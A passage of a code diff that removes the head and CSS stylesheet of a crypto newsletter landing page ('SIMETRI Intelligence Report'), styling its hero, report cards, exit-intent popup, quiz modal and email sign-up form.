@@ -1,2316 +1,1445 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Crypto Briefing — Your SIMETRI Intelligence Report</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Lora:ital,wght@0,600;0,700;1,600;1,700&family=JetBrains+Mono:wght@400;500;700&display=swap"
-        rel="stylesheet" />
-    <style>
-        /* ── TOKENS ───────────────────────────────────── */
-        :root {
-            --bg: #FFFFFF;
-            --bg-soft: #F7F9FC;
-            --bg-wash: #F0F4FF;
-            --bg-dark: #0B0E14;
-            --bg-dark-2: #12161F;
-            --bg-dark-3: #1A2030;
-            --surface: #FFFFFF;
-            --border: #E2E8F2;
-            --border-dark: #1F2733;
-            --text: #0D1321;
-            --text-mid: #3A4660;
-            --text-muted: #6B7A99;
-            --text-faint: #9BAAC4;
-            --blue: #1E3A8A;
-            --blue-mid: #2563EB;
-            --blue-light: #3B82F6;
-            --blue-wash: #EFF4FF;
-            --gold: #C8A951;
-            --gold-light: #F5E9BF;
-            --green: #16A34A;
-            --green-wash: #DCFCE7;
-            --red: #DC2626;
-            --red-wash: #FEE2E2;
-            --amber: #D97706;
-            --mono: 'JetBrains Mono', monospace;
-            --serif: 'Lora', Georgia, serif;
-            --sans: 'Inter', system-ui, sans-serif;
-            --r: 5px;
-            --r-lg: 10px;
-            --r-xl: 16px;
-            --shadow-sm: 0 1px 4px rgba(10, 20, 60, 0.07);
-            --shadow-md: 0 4px 20px rgba(10, 20, 60, 0.10);
-            --shadow-lg: 0 20px 64px rgba(10, 20, 60, 0.16);
-        }
-
-        *,
-        *::before,
-        *::after {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            font-family: var(--sans);
-            background: var(--bg);
-            color: var(--text);
-            font-size: 15px;
-            line-height: 1.65;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        a {
-            color: var(--blue-mid);
-            text-decoration: none;
-        }
-
-        button {
-            font-family: var(--sans);
-        }
-
-        img {
-            display: block;
-        }
-
-        /* ── NAV ───────────────────────────────────────── */
-        .nav {
-            position: sticky;
-            top: 0;
-            z-index: 800;
-            background: rgba(255, 255, 255, 0.96);
-            backdrop-filter: blur(12px);
-            border-bottom: 1px solid var(--border);
-            height: 58px;
-            display: flex;
-            align-items: center;
-            padding: 0 28px;
-        }
-
-        .nav-inner {
-            max-width: 1160px;
-            width: 100%;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 20px;
-        }
-
-        .nav-logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-family: var(--sans);
-            font-weight: 700;
-            font-size: 15px;
-            color: var(--text);
-            white-space: nowrap;
-            text-decoration: none;
-        }
-
-        .nav-links {
-            display: flex;
-            align-items: center;
-            gap: 24px;
-            list-style: none;
-        }
-
-        .nav-links a {
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-muted);
-            transition: color .15s;
-        }
-
-        .nav-links a:hover {
-            color: var(--text);
-        }
-
-        .nav-right {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .nav-login {
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--blue);
-            padding: 7px 14px;
-            border-radius: var(--r);
-            border: 1px solid rgba(30, 58, 138, 0.2);
-            background: none;
-            cursor: pointer;
-            transition: all .15s;
-        }
-
-        .nav-login:hover {
-            background: var(--blue-wash);
-            border-color: var(--blue);
-        }
-
-        .nav-cta {
-            font-size: 13px;
-            font-weight: 700;
-            color: #fff;
-            padding: 8px 18px;
-            border-radius: var(--r);
-            background: var(--blue);
-            border: none;
-            cursor: pointer;
-            transition: background .15s, transform .1s;
-        }
-
-        .nav-cta:hover {
-            background: var(--blue-mid);
-            transform: translateY(-1px);
-        }
-
-        /* ── HERO ──────────────────────────────────────── */
-        .hero {
-            background: var(--bg-dark);
-            border-bottom: 1px solid var(--border-dark);
-            padding: 72px 28px 68px;
-        }
-
-        .hero-inner {
-            max-width: 1160px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1.1fr 1fr;
-            gap: 72px;
-            align-items: center;
-        }
-
-        .hero-tag {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            font-family: var(--mono);
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--gold);
-            letter-spacing: 0.1em;
-            text-transform: uppercase;
-            margin-bottom: 22px;
-        }
-
-        .hero-tag-dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: var(--gold);
-            animation: glow 2.2s ease-in-out infinite;
-        }
-
-        @keyframes glow {
-
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(200, 169, 81, 0.5);
-            }
-
-            50% {
-                box-shadow: 0 0 0 6px rgba(200, 169, 81, 0);
-            }
-        }
-
-        .hero h1 {
-            font-family: var(--serif);
-            font-size: 44px;
-            font-weight: 700;
-            line-height: 1.1;
-            color: #fff;
-            letter-spacing: -0.01em;
-            margin-bottom: 20px;
-        }
-
-        .hero h1 em {
-            font-style: italic;
-            color: var(--gold);
-        }
-
-        .hero-sub {
-            font-size: 15px;
-            color: rgba(255, 255, 255, 0.55);
-            line-height: 1.75;
-            max-width: 460px;
-            margin-bottom: 34px;
-        }
-
-        .hero-actions {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-
-        .btn-gold {
-            background: var(--gold);
-            color: #0B0E14;
-            padding: 13px 26px;
-            border-radius: var(--r);
-            font-size: 14px;
-            font-weight: 700;
-            border: none;
-            cursor: pointer;
-            transition: background .15s, transform .1s, box-shadow .15s;
-            box-shadow: 0 4px 16px rgba(200, 169, 81, 0.32);
-        }
-
-        .btn-gold:hover {
-            background: #d9b85a;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 22px rgba(200, 169, 81, 0.44);
-        }
-
-        .btn-ghost {
-            background: rgba(255, 255, 255, 0.06);
-            color: rgba(255, 255, 255, 0.65);
-            padding: 13px 22px;
-            border-radius: var(--r);
-            font-size: 14px;
-            font-weight: 600;
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            cursor: pointer;
-            transition: all .15s;
-        }
-
-        .btn-ghost:hover {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-        }
-
-        .hero-note {
-            margin-top: 16px;
-            font-family: var(--mono);
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.22);
-            letter-spacing: 0.04em;
-        }
-
-        /* SIMETRI Card — hero right */
-        .simetri-card {
-            background: var(--bg-dark-2);
-            border: 1px solid var(--border-dark);
-            border-radius: var(--r-xl);
-            overflow: hidden;
-            box-shadow: 0 32px 80px rgba(0, 0, 0, 0.4);
-            animation: riseIn .5s cubic-bezier(0.22, 1, 0.36, 1) both;
-        }
-
-        @keyframes riseIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px)
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0)
-            }
-        }
-
-        .sc-header {
-            padding: 16px 22px;
-            border-bottom: 1px solid var(--border-dark);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .sc-header-left {
-            display: flex;
-            flex-direction: column;
-            gap: 2px;
-        }
-
-        .sc-label {
-            font-family: var(--mono);
-            font-size: 9px;
-            font-weight: 700;
-            color: rgba(255, 255, 255, 0.3);
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-        }
-
-        .sc-project {
-            font-size: 14px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        .sc-grade-wrap {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 2px;
-        }
-
-        .sc-grade {
-            font-family: var(--mono);
-            font-size: 28px;
-            font-weight: 700;
-            color: var(--gold);
-            line-height: 1;
-        }
-
-        .sc-grade-label {
-            font-family: var(--mono);
-            font-size: 8px;
-            font-weight: 600;
-            color: rgba(200, 169, 81, 0.55);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
-
-        .sc-body {
-            padding: 20px 22px;
-        }
-
-        .sc-score-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 9px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .sc-score-row:last-of-type {
-            border-bottom: none;
-        }
-
-        .sc-score-name {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.45);
-        }
-
-        .sc-score-bar-wrap {
-            flex: 1;
-            margin: 0 14px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.07);
-            border-radius: 2px;
-        }
-
-        .sc-score-bar {
-            height: 100%;
-            border-radius: 2px;
-            transition: width .4s ease;
-        }
-
-        .sc-score-val {
-            font-family: var(--mono);
-            font-size: 12px;
-            font-weight: 700;
-            color: rgba(255, 255, 255, 0.75);
-        }
-
-        .sc-footer {
-            padding: 12px 22px;
-            border-top: 1px solid var(--border-dark);
-            background: rgba(255, 255, 255, 0.02);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .sc-footer-note {
-            font-family: var(--mono);
-            font-size: 9px;
-            color: rgba(255, 255, 255, 0.2);
-            line-height: 1.5;
-        }
-
-        .sc-personalized-tag {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            font-family: var(--mono);
-            font-size: 9px;
-            font-weight: 700;
-            color: var(--gold);
-            letter-spacing: 0.06em;
-            text-transform: uppercase;
-            background: rgba(200, 169, 81, 0.1);
-            border: 1px solid rgba(200, 169, 81, 0.2);
-            padding: 4px 10px;
-            border-radius: 40px;
-        }
-
-        /* ── TRUST STRIP ─────────────────────────────── */
-        .trust-strip {
-            background: var(--bg-soft);
-            border-bottom: 1px solid var(--border);
-            padding: 20px 28px;
-        }
-
-        .trust-inner {
-            max-width: 1160px;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .trust-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .trust-icon {
-            flex-shrink: 0;
-        }
-
-        .trust-val {
-            font-size: 14px;
-            font-weight: 700;
-            color: var(--text);
-        }
-
-        .trust-desc {
-            font-size: 12px;
-            color: var(--text-muted);
-        }
-
-        .trust-sep {
-            width: 1px;
-            height: 28px;
-            background: var(--border);
-            flex-shrink: 0;
-        }
-
-        /* ── SECTIONS ────────────────────────────────── */
-        .sect {
-            padding: 80px 28px;
-        }
-
-        .sect-alt {
-            background: var(--bg-soft);
-            border-top: 1px solid var(--border);
-            border-bottom: 1px solid var(--border);
-        }
-
-        .sect-inner {
-            max-width: 1160px;
-            margin: 0 auto;
-        }
-
-        .sect-eyebrow {
-            font-family: var(--mono);
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--blue);
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            margin-bottom: 12px;
-        }
-
-        .sect-title {
-            font-family: var(--serif);
-            font-size: 32px;
-            font-weight: 700;
-            color: var(--text);
-            line-height: 1.22;
-            letter-spacing: -0.01em;
-            margin-bottom: 14px;
-        }
-
-        .sect-sub {
-            font-size: 15px;
-            color: var(--text-muted);
-            max-width: 540px;
-            line-height: 1.75;
-            margin-bottom: 52px;
-        }
-
-        /* Editorial feature rows */
-        .feat-list {
-            display: flex;
-            flex-direction: column;
-            gap: 0;
-        }
-
-        .feat-row {
-            display: grid;
-            grid-template-columns: 80px 1fr 200px;
-            gap: 32px;
-            align-items: start;
-            padding: 36px 0;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .feat-row:first-child {
-            border-top: 1px solid var(--border);
-        }
-
-        .feat-index {
-            font-family: var(--mono);
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--text-faint);
-            padding-top: 4px;
-            letter-spacing: 0.06em;
-        }
-
-        .feat-content h3 {
-            font-family: var(--serif);
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--text);
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
-
-        .feat-content p {
-            font-size: 13px;
-            color: var(--text-muted);
-            line-height: 1.7;
-        }
-
-        .feat-tag {
-            display: inline-block;
-            margin-top: 12px;
-            padding: 3px 10px;
-            border-radius: 40px;
-            font-family: var(--mono);
-            font-size: 9px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
-
-        .feat-tag-blue {
-            background: var(--blue-wash);
-            color: var(--blue);
-        }
-
-        .feat-tag-gold {
-            background: var(--gold-light);
-            color: #7A6010;
-        }
-
-        .feat-tag-green {
-            background: var(--green-wash);
-            color: #14532D;
-        }
-
-        .feat-viz {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        /* Sample output section */
-        .sample-grid {
-            display: grid;
-            grid-template-columns: 1fr 1.4fr;
-            gap: 36px;
-            align-items: start;
-        }
-
-        .report-card {
-            background: var(--bg-dark);
-            border: 1px solid var(--border-dark);
-            border-radius: var(--r-xl);
-            overflow: hidden;
-        }
-
-        .rc-top {
-            padding: 20px 24px;
-            border-bottom: 1px solid var(--border-dark);
-        }
-
-        .rc-top-eyebrow {
-            font-family: var(--mono);
-            font-size: 9px;
-            font-weight: 700;
-            color: rgba(255, 255, 255, 0.3);
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            margin-bottom: 6px;
-        }
-
-        .rc-top-title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-
-        .rc-top-meta {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .rc-badge {
-            font-family: var(--mono);
-            font-size: 9px;
-            font-weight: 700;
-            padding: 3px 9px;
-            border-radius: 40px;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-        }
-
-        .rc-badge-gold {
-            background: rgba(200, 169, 81, 0.15);
-            color: var(--gold);
-            border: 1px solid rgba(200, 169, 81, 0.25);
-        }
-
-        .rc-badge-blue {
-            background: rgba(37, 99, 235, 0.15);
-            color: #60A5FA;
-            border: 1px solid rgba(37, 99, 235, 0.25);
-        }
-
-        .rc-body {
-            padding: 20px 24px;
-        }
-
-        .rc-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            padding: 7px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .rc-row:last-child {
-            border-bottom: none;
-        }
-
-        .rc-k {
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.35);
-        }
-
-        .rc-v {
-            font-family: var(--mono);
-            font-size: 11px;
-            font-weight: 600;
-        }
-
-        .rc-v-white {
-            color: rgba(255, 255, 255, 0.8);
-        }
-
-        .rc-v-gold {
-            color: var(--gold);
-        }
-
-        .rc-v-blue {
-            color: #60A5FA;
-        }
-
-        .rc-v-green {
-            color: #4ADE80;
-        }
-
-        .rc-v-red {
-            color: #F87171;
-        }
-
-        .analysis-panels {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .ap {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--r-lg);
-            overflow: hidden;
-        }
-
-        .ap-head {
-            padding: 11px 18px;
-            background: var(--bg-soft);
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .ap-dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-        }
-
-        .ap-title {
-            font-family: var(--mono);
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
-
-        .ap-body {
-            padding: 14px 18px;
-        }
-
-        .ap-finding {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            padding: 7px 0;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .ap-finding:last-child {
-            border-bottom: none;
-        }
-
-        .ap-finding-icon {
-            font-size: 11px;
-            margin-top: 3px;
-            flex-shrink: 0;
-        }
-
-        .ap-finding-text {
-            font-size: 12px;
-            color: var(--text-mid);
-            line-height: 1.55;
-        }
-
-        .ap-finding-mono {
-            font-family: var(--mono);
-            font-size: 10px;
-            color: var(--text-faint);
-            margin-top: 2px;
-        }
-
-        /* ── FINAL CTA ───────────────────────────────── */
-        .final-cta-sect {
-            background: var(--bg-dark);
-            padding: 80px 28px;
-            text-align: center;
-            border-top: 1px solid var(--border-dark);
-        }
-
-        .final-cta-inner {
-            max-width: 580px;
-            margin: 0 auto;
-        }
-
-        .final-cta-inner .fc-eyebrow {
-            font-family: var(--mono);
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--gold);
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            margin-bottom: 16px;
-        }
-
-        .final-cta-inner h2 {
-            font-family: var(--serif);
-            font-size: 34px;
-            font-weight: 700;
-            color: #fff;
-            line-height: 1.2;
-            margin-bottom: 16px;
-        }
-
-        .final-cta-inner p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.5);
-            line-height: 1.75;
-            margin-bottom: 30px;
-        }
-
-        .final-cta-note {
-            font-family: var(--mono);
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.2);
-            margin-top: 14px;
-        }
-
-        /* ── FOOTER ──────────────────────────────────── */
-        footer {
-            background: var(--bg-dark-2);
-            border-top: 1px solid var(--border-dark);
-            padding: 44px 28px 32px;
-        }
-
-        .footer-inner {
-            max-width: 1160px;
-            margin: 0 auto;
-            display: flex;
-            align-items: flex-start;
-            justify-content: space-between;
-            gap: 32px;
-            flex-wrap: wrap;
-        }
-
-        .footer-brand {
-            display: flex;
-            align-items: center;
-            gap: 9px;
-            margin-bottom: 12px;
-        }
-
-        .footer-brand-name {
-            font-weight: 700;
-            font-size: 14px;
-            color: #fff;
-        }
-
-        .footer-legal {
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.25);
-            max-width: 480px;
-            line-height: 1.7;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 16px;
-        }
-
-        .footer-links a {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.3);
-            transition: color .15s;
-        }
-
-        .footer-links a:hover {
-            color: rgba(255, 255, 255, 0.65);
-        }
-
-        .footer-bottom {
-            max-width: 1160px;
-            margin: 28px auto 0;
-            padding-top: 20px;
-            border-top: 1px solid var(--border-dark);
-            font-family: var(--mono);
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.18);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        /* ═════════════════════════════════════════════   EXIT-INTENT POPUP═════════════════════════════════════════════ */
-        .overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(6, 10, 20, 0.76);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            backdrop-filter: blur(5px);
-            animation: fadeIn .2s ease;
-        }
-
-        .overlay.active {
-            display: flex;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0
-            }
-
-            to {
-                opacity: 1
-            }
-        }
-
-        .exit-card {
-            background: var(--bg-dark-2);
-            border: 1px solid var(--border-dark);
-            border-radius: var(--r-xl);
-            max-width: 480px;
-            width: 100%;
-            overflow: hidden;
-            animation: popUp .28s cubic-bezier(0.34, 1.18, 0.64, 1);
-            box-shadow: var(--shadow-lg);
-        }
-
-        @keyframes popUp {
-            from {
-                opacity: 0;
-                transform: translateY(22px)
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0)
-            }
-        }
-
-        .exit-stripe {
-            height: 3px;
-            background: linear-gradient(90deg, var(--blue) 0%, var(--gold) 100%);
-        }
-
-        .exit-body {
-            padding: 32px 34px 36px;
-        }
-
-        .exit-icon {
-            margin-bottom: 16px;
-        }
-
-        .exit-card h2 {
-            font-family: var(--serif);
-            font-size: 22px;
-            font-weight: 700;
-            color: #fff;
-            line-height: 1.28;
-            margin-bottom: 12px;
-        }
-
-        .exit-card p {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.48);
-            line-height: 1.7;
-            margin-bottom: 24px;
-        }
-
-        .exit-cta {
-            width: 100%;
-            padding: 13px;
-            background: var(--gold);
-            color: #0B0E14;
-            border: none;
-            border-radius: var(--r);
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background .15s;
-            margin-bottom: 10px;
-        }
-
-        .exit-cta:hover {
-            background: #d9b85a;
-        }
-
-        .exit-dismiss {
-            display: block;
-            width: 100%;
-            text-align: center;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.22);
-            background: none;
-            border: none;
-            cursor: pointer;
-            transition: color .15s;
-        }
-
-        .exit-dismiss:hover {
-            color: rgba(255, 255, 255, 0.45);
-        }
-
-        /* ═════════════════════════════════════════════   QUIZ MODAL═════════════════════════════════════════════ */
-        .quiz-card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--r-xl);
-            max-width: 600px;
-            width: 100%;
-            max-height: 92vh;
-            overflow-y: auto;
-            animation: popUp .3s cubic-bezier(0.34, 1.18, 0.64, 1);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .qc-header {
-            position: sticky;
-            top: 0;
-            z-index: 10;
-            background: var(--bg-dark);
-            padding: 18px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .qc-hd-left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .qc-title {
-            font-family: var(--mono);
-            font-size: 11px;
-            font-weight: 700;
-            color: rgba(255, 255, 255, 0.6);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
-
-        .qc-counter {
-            font-family: var(--mono);
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.28);
-        }
-
-        .qc-close {
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.07);
-            border: none;
-            color: rgba(255, 255, 255, 0.45);
-            font-size: 15px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background .15s;
-        }
-
-        .qc-close:hover {
-            background: rgba(255, 255, 255, 0.14);
-        }
-
-        .qc-progress {
-            height: 3px;
-            background: rgba(255, 255, 255, 0.06);
-        }
-
-        .qc-bar {
-            height: 100%;
-            background: linear-gradient(90deg, var(--blue) 0%, var(--gold) 100%);
-            transition: width .35s ease;
-        }
-
-        .qc-body {
-            padding: 32px 28px;
-        }
-
-        .quiz-step {
-            display: none;
-        }
-
-        .quiz-step.active {
-            display: block;
-        }
-
-        .qs-section {
-            font-family: var(--mono);
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--blue);
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            margin-bottom: 10px;
-        }
-
-        .qs-q {
-            font-family: var(--serif);
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--text);
-            line-height: 1.28;
-            margin-bottom: 8px;
-        }
-
-        .qs-sub {
-            font-size: 13px;
-            color: var(--text-muted);
-            line-height: 1.65;
-            margin-bottom: 26px;
-        }
-
-        .opt-list {
-            display: flex;
-            flex-direction: column;
-            gap: 9px;
-        }
-
-        .opt {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 13px 16px;
-            border: 1.5px solid var(--border);
-            border-radius: var(--r);
-            cursor: pointer;
-            transition: border-color .15s, background .15s;
-        }
-
-        .opt:hover {
-            border-color: var(--blue-light);
-            background: var(--blue-wash);
-        }
-
-        .opt.sel {
-            border-color: var(--blue);
-            background: var(--blue-wash);
-        }
-
-        .opt-radio {
-            width: 17px;
-            height: 17px;
-            border-radius: 50%;
-            border: 2px solid var(--border);
-            flex-shrink: 0;
-            transition: all .15s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .opt.sel .opt-radio {
-            border-color: var(--blue);
-            background: var(--blue);
-        }
-
-        .opt.sel .opt-radio::after {
-            content: '';
-            width: 5px;
-            height: 5px;
-            border-radius: 50%;
-            background: #fff;
-        }
-
-        .opt-text {
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text);
-            line-height: 1.4;
-        }
-
-        .opt-text span {
-            display: block;
-            font-size: 12px;
-            font-weight: 400;
-            color: var(--text-muted);
-            margin-top: 2px;
-        }
-
-        /* Tags (multi-select) */
-        .tag-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 9px;
-        }
-
-        .tag-opt {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            padding: 8px 15px;
-            border: 1.5px solid var(--border);
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text);
-            transition: all .15s;
-            user-select: none;
-        }
-
-        .tag-opt:hover {
-            border-color: var(--blue-light);
-            color: var(--blue);
-        }
-
-        .tag-opt.sel {
-            border-color: var(--blue);
-            background: var(--blue-wash);
-            color: var(--blue);
-        }
-
-        .tag-ck {
-            width: 13px;
-            height: 13px;
-            border-radius: 3px;
-            border: 2px solid var(--border);
-            flex-shrink: 0;
-            transition: all .15s;
-        }
-
-        .tag-opt.sel .tag-ck {
-            background: var(--blue);
-            border-color: var(--blue);
-            background-image: url("data:image/svg+xml,%3Csvg width='9' height='7' viewBox='0 0 9 7' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 3.5L3 5.5L8 1' stroke='white' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-
-        /* Email */
-        .email-block {
-            margin-top: 22px;
-            padding-top: 22px;
-            border-top: 1px solid var(--border);
-        }
-
-        .email-block label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text);
-            margin-bottom: 8px;
-        }
-
-        .email-block input {
-            width: 100%;
-            padding: 11px 15px;
-            border: 1.5px solid var(--border);
-            border-radius: var(--r);
-            font-size: 14px;
-            font-family: var(--sans);
-            color: var(--text);
-            outline: none;
-            transition: border-color .15s;
-        }
-
-        .email-block input:focus {
-            border-color: var(--blue);
-        }
-
-        .email-block input.err {
-            border-color: var(--red);
-        }
-
-        .email-err {
-            font-size: 12px;
-            color: var(--red);
-            margin-top: 5px;
-            display: none;
-        }
-
-        /* QC footer */
-        .qc-footer {
-            padding: 0 28px 28px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .qc-back {
-            background: none;
-            border: 1px solid var(--border);
-            border-radius: var(--r);
-            padding: 10px 18px;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-muted);
-            cursor: pointer;
-            transition: all .15s;
-        }
-
-        .qc-back:hover {
-            border-color: var(--text-muted);
-            color: var(--text);
-        }
-
-        .qc-back:disabled {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .qc-next {
-            background: var(--blue);
-            border: none;
-            border-radius: var(--r);
-            padding: 11px 26px;
-            font-size: 14px;
-            font-weight: 700;
-            color: #fff;
-            cursor: pointer;
-            transition: background .15s, opacity .15s;
-        }
-
-        .qc-next:disabled {
-            opacity: 0.32;
-            cursor: not-allowed;
-        }
-
-        .qc-next:not(:disabled):hover {
-            background: var(--blue-mid);
-        }
-
-        /* Loader */
-        .loader-pane {
-            padding: 40px 20px;
-            text-align: center;
-        }
-
-        .spin-ring {
-            width: 52px;
-            height: 52px;
-            border-radius: 50%;
-            border: 3px solid var(--border);
-            border-top-color: var(--blue);
-            animation: spin 0.85s linear infinite;
-            margin: 0 auto 22px;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .loader-title {
-            font-family: var(--serif);
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--text);
-            margin-bottom: 8px;
-        }
-
-        .loader-sub {
-            font-size: 13px;
-            color: var(--text-muted);
-            max-width: 340px;
-            margin: 0 auto 28px;
-            line-height: 1.65;
-        }
-
-        .chk-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            max-width: 320px;
-            margin: 0 auto;
-            text-align: left;
-        }
-
-        .chk-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 13px;
-            color: var(--text-muted);
-            transition: color .3s;
-        }
-
-        .chk-item.done {
-            color: var(--text);
-        }
-
-        .chk-icon {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            border: 2px solid var(--border);
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-            transition: all .3s;
-        }
-
-        .chk-item.done .chk-icon {
-            background: var(--green);
-            border-color: var(--green);
-            color: #fff;
-        }
-
-        /* Success */
-        .success-pane {
-            padding: 40px 20px 24px;
-            text-align: center;
-        }
-
-        .success-ring {
-            width: 68px;
-            height: 68px;
-            border-radius: 50%;
-            background: var(--green-wash);
-            margin: 0 auto 18px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pop .4s cubic-bezier(0.34, 1.4, 0.64, 1);
-        }
-
-        @keyframes pop {
-            from {
-                transform: scale(0.5);
-                opacity: 0
-            }
-
-            to {
-                transform: scale(1);
-                opacity: 1
-            }
-        }
-
-        .success-pane h2 {
-            font-family: var(--serif);
-            font-size: 22px;
-            font-weight: 700;
-            color: var(--text);
-            margin-bottom: 10px;
-        }
-
-        .success-pane p {
-            font-size: 13px;
-            color: var(--text-muted);
-            max-width: 400px;
-            margin: 0 auto 24px;
-            line-height: 1.7;
-        }
-
-        .report-summary {
-            background: var(--bg-soft);
-            border: 1px solid var(--border);
-            border-radius: var(--r);
-            padding: 16px 20px;
-            max-width: 420px;
-            margin: 0 auto 22px;
-            text-align: left;
-        }
-
-        .rs-title {
